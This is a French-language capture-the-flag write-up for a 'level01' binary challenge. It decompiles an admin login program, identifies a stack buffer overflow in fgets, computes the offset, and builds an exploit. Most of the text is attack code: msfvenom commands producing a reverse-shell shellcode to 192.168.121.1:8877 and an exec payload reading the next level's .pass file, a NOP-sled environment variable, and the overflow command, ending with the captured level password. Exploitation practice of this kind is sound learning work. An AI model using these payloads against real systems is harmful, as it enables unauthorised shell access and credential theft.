```
level01:uSq2ehEGT6c9S24zbshexZQBXUGrncxn5sD5QfGL
```

![](Pasted%20image%2020240806234223.png)

![](Pasted%20image%2020240806234620.png)

```c
undefined4 main(void)

{
  undefined4 uVar1;
  int iVar2;
  undefined4 *puVar3;
  undefined4 local_54 [16];
  int local_14;
  
  puVar3 = local_54;
  for (iVar2 = 16; iVar2 != 0; iVar2 = iVar2 + -1) {
    *puVar3 = 0;
    puVar3 = puVar3 + 1;
  }
  local_14 = 0;
  puts("********* ADMIN LOGIN PROMPT *********");
  printf("Enter Username: ");
  fgets(&a_user_name,256,stdin);
  local_14 = verify_user_name();
  if (local_14 == 0) {
    puts("Enter Password: ");
    fgets((char *)local_54,100,stdin);
    local_14 = verify_user_pass((byte *)local_54);
    if ((local_14 == 0) || (local_14 != 0)) {
      puts("nope, incorrect password...\n");
      uVar1 = 1;
    }
    else {
      uVar1 = 0;
    }
  }
  else {
    puts("nope, incorrect username...\n");
    uVar1 = 1;
  }
  return uVar1;
}
```

on voit 2 fonction verify_user_name et verify_user_pass

```c
int verify_user_name(void)

{
  int iVar1;
  byte *pbVar2;
  byte *pbVar3;
  undefined uVar4;
  undefined uVar5;
  byte bVar6;
  
  bVar6 = 0;
  uVar4 = &stack0xfffffff4 < (undefined *)16;
  uVar5 = &stack0x00000000 == (undefined *)28;
  puts("verifying username....\n");
  iVar1 = 7;
  pbVar2 = &a_user_name;
  pbVar3 = (byte *)"dat_wil";
  do {
    if (iVar1 == 0) break;
    iVar1 = iVar1 + -1;
    uVar4 = *pbVar2 < *pbVar3;
    uVar5 = *pbVar2 == *pbVar3;
    pbVar2 = pbVar2 + (uint)bVar6 * -2 + 1;
    pbVar3 = pbVar3 + (uint)bVar6 * -2 + 1;
  } while ((bool)uVar5);
  return (int)(char)((!(bool)uVar4 && !(bool)uVar5) - uVar4);
}

```

```c
int verify_user_pass(byte *param_1)

{
  int iVar1;
  byte *pbVar2;
  undefined in_CF;
  undefined in_ZF;
  
  iVar1 = 5;
  pbVar2 = (byte *)"admin";
  do {
    if (iVar1 == 0) break;
    iVar1 = iVar1 + -1;
    in_CF = *param_1 < *pbVar2;
    in_ZF = *param_1 == *pbVar2;
    param_1 = param_1 + 1;
    pbVar2 = pbVar2 + 1;
  } while ((bool)in_ZF);
  return (int)(char)((!(bool)in_CF && !(bool)in_ZF) - in_CF);
}
```

on peut voir un buffer over flow potentiel dans le fgets de la ligne 23

# calcul de loffset

![](Pasted%20image%2020240807000202.png)

![](Pasted%20image%2020240807000145.png)

# control de l'EPI

![](Pasted%20image%2020240807000434.png)

on a controle corectement l'eip avec un chunk de 80

# shellcode 

```
❯ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.121.1 LPORT=8877 -f py –e x86/shikata_ga_nai -b "\x00\x0a\x1a\x2f" PrependSetuid=True
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 102 (iteration=0)
x86/shikata_ga_nai chosen with final size 102
Payload size: 102 bytes
Final size of py file: 518 bytes
buf =  b""
buf += b"\xba\x4c\x17\xe5\x96\xd9\xcb\xd9\x74\x24\xf4\x5b"
buf += b"\x31\xc9\xb1\x13\x31\x53\x15\x03\x53\x15\x83\xeb"
buf += b"\xfc\xe2\xb9\x26\x3e\xfc\x56\x11\x0d\x81\x69\x7a"
buf += b"\x7a\x61\xda\x3f\xd6\x0c\xde\x36\x39\x60\xb8\x85"
buf += b"\x3a\x12\x1d\xa6\x04\xd8\x1d\x8f\x03\x1b\x75\xd0"
buf += b"\x5c\xa2\x84\xb8\x9e\x55\xa4\x95\x16\xb4\x18\x83"
buf += b"\x78\x66\x0b\xff\x7a\x01\x4a\x32\xfc\x43\xe4\xa3"
buf += b"\xd2\x10\x9c\x53\x02\xf8\x3e\xcd\xd5\xe5\xec\x5e"
buf += b"\x6f\x08\xa0\x6a\xa2\x4b"

"\xba\x4c\x17\xe5\x96\xd9\xcb\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x13\x31\x53\x15\x03\x53\x15\x83\xeb\xfc\xe2\xb9\x26\x3e\xfc\x56\x11\x0d\x81\x69\x7a\x7a\x61\xda\x3f\xd6\x0c\xde\x36\x39\x60\xb8\x85\x3a\x12\x1d\xa6\x04\xd8\x1d\x8f\x03\x1b\x75\xd0\x5c\xa2\x84\xb8\x9e\x55\xa4\x95\x16\xb4\x18\x83\x78\x66\x0b\xff\x7a\x01\x4a\x32\xfc\x43\xe4\xa3\xd2\x10\x9c\x53\x02\xf8\x3e\xcd\xd5\xe5\xec\x5e\x6f\x08\xa0\x6a\xa2\x4b"
```

# env EVIL

```
export EVIL=`python -c 'print "\x90" * 525 + "\xba\x4c\x17\xe5\x96\xd9\xcb\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x13\x31\x53\x15\x03\x53\x15\x83\xeb\xfc\xe2\xb9\x26\x3e\xfc\x56\x11\x0d\x81\x69\x7a\x7a\x61\xda\x3f\xd6\x0c\xde\x36\x39\x60\xb8\x85\x3a\x12\x1d\xa6\x04\xd8\x1d\x8f\x03\x1b\x75\xd0\x5c\xa2\x84\xb8\x9e\x55\xa4\x95\x16\xb4\x18\x83\x78\x66\x0b\xff\x7a\x01\x4a\x32\xfc\x43\xe4\xa3\xd2\x10\x9c\x53\x02\xf8\x3e\xcd\xd5\xe5\xec\x5e\x6f\x08\xa0\x6a\xa2\x4b"'`
```

# find EVIL address

```
b *main
r
x/s *((char **)environ+3)
```

![](Pasted%20image%2020240808034403.png)

nous allons voir comment cette variable occue la memoire
```
x/150xg 0xffffd69c
```

on voit bien notre champ de nop on a plus qua sauter dedans avec l'overflow
# exploit 

```
(python -c '''
user = "dat_wil"
padding = "A" * (256 - len(user) + 80)
print(user + padding + "\xff\xff\xd6\xcc"[::-1])
''') | ./level01
```

![](Pasted%20image%2020240808034757.png)

comme on peut le vvoir l'overflow a echouer avec un offset de 80, j'ai essayer avec un de 79 et on a bien le reverseshell qui a triger par contre on a pas l'impersonisation du  suid

```
❯ msfvenom -p linux/x86/exec CMD="/bin/cat /home/users/level02/.pass" –e x86/shikata_ga_nai -b "\x00\x0a\x1a\x2f" PrependSetuid=True -f py
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 104 (iteration=0)
x86/shikata_ga_nai chosen with final size 104
Payload size: 104 bytes
Final size of py file: 526 bytes
buf =  b""
buf += b"\xd9\xe8\xd9\x74\x24\xf4\xbe\x57\x98\xab\xc3\x58"
buf += b"\x31\xc9\xb1\x14\x31\x70\x18\x03\x70\x18\x83\xc0"
buf += b"\x53\x7a\x5e\xf2\x80\x10\xb6\xad\xfb\x65\xd2\x46"
buf += b"\x5b\xff\x71\x3f\x33\xd2\x16\x36\x24\x44\xf6\x3b"
buf += b"\xc2\x95\x60\x93\x70\xff\x1e\x62\x97\xad\x36\x57"
buf += b"\x57\x52\xc7\xb7\x35\x3b\xa9\xe8\xda\xda\x41\xd7"
buf += b"\x33\x75\xc5\x7a\x2e\xaa\x6c\xf6\xd5\xc6\xfd\xd7"
buf += b"\x79\x42\x74\x4d\xed\xbc\x4a\xa2\xc3\xcc\xcb\xcf"
buf += b"\x68\x2d\x5b\x63\x07\xcc\xae\x03"

export EVIL=`python -c 'print "\x90" * 525 + "\xd9\xe8\xd9\x74\x24\xf4\xbe\x57\x98\xab\xc3\x58\x31\xc9\xb1\x14\x31\x70\x18\x03\x70\x18\x83\xc0\x53\x7a\x5e\xf2\x80\x10\xb6\xad\xfb\x65\xd2\x46\x5b\xff\x71\x3f\x33\xd2\x16\x36\x24\x44\xf6\x3b\xc2\x95\x60\x93\x70\xff\x1e\x62\x97\xad\x36\x57\x57\x52\xc7\xb7\x35\x3b\xa9\xe8\xda\xda\x41\xd7\x33\x75\xc5\x7a\x2e\xaa\x6c\xf6\xd5\xc6\xfd\xd7\x79\x42\x74\x4d\xed\xbc\x4a\xa2\xc3\xcc\xcb\xcf\x68\x2d\x5b\x63\x07\xcc\xae\x03"'`

0xffffd71a

(python -c '''
user = "dat_wil"
padding = "A" * (256 - len(user) + 79)
print(user + padding + "\xff\xff\xd7\x1a"[::-1])
''') | ./level01

PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```

![](Pasted%20image%2020240808042810.png)

```
level02 : PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```